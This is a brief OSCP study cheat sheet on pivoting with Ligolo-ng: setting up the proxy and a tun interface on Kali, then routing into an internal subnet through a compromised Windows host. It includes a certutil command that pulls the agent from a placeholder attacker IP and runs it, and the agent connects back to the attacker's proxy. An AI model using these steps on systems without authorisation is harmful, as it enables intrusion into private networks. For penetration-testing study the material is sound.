# Ligolo-ng — Tunneling & Pivoting (OSCP)

## **How It Works**

- **Agent** runs on victim
- **Proxy** runs on Kali
- Creates a tunnel so Kali uses the victim’s network



## **Assumption**

You downloaded:
- ligolo-ng_proxy_*.tar.gz (Kali proxy)
- ligolo-ng_agent_*_windows_amd64.zip (Windows agent)
Both are in downloads


## **Kali: prep a staging folder (so you don’t lose files)**
```bash
mkdir -p ~/oscp/staging/ligolo
cd ~/oscp/staging/ligolo
```

## **Kali: extract the proxy**
```bash
tar -xzf ~/Downloads/ligolo-ng_proxy_*.tar.gz
ls
```

Move it to /usr/bin:
```bash
sudo mv proxy /usr/bin/ligolo-proxy 2>/dev/null || sudo mv ligolo-proxy /usr/bin/ligolo-proxy
sudo chmod +x /usr/bin/ligolo-proxy
```

## **Kali: extract the Windows agent**
```bash
unzip ~/Downloads/ligolo-ng_agent_*_windows_amd64.zip -d .
ls
```

## **Kali: host the agent for download (HTTP)**
```bash
python3 -m http.server 8000
```
Leave this running.

## **Kali: create the Ligolo tunnel interface**
Open a new terminal:
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ip a | grep -A2 ligolo
```

## **Kali: start the Ligolo proxy**
```bash
ligolo-proxy -selfcert
```


## **Victim: download agent into Public**
On the victim:

```cmd
cd C:\Users\Public
certutil -urlcache -f http://<KALI_IP>:8000/<agent.exe> agent.exe
dir
```

## **Victim: run the agent**
```cmd
C:\Users\Public\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```


## **Kali (proxy terminal): select session + start**
Inside ligolo-proxy:
`session`
Pick the session number, then:
`start`

## **Kali: add route to the internal network**
```bash
sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo
```
## **Test from Kali**
```bash
ping <internal_ip>
nmap -p 445 <internal_ip>
```

## **Cleanup (when done)**
```bash
sudo ip route del <INTERNAL_SUBNET>/24
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
```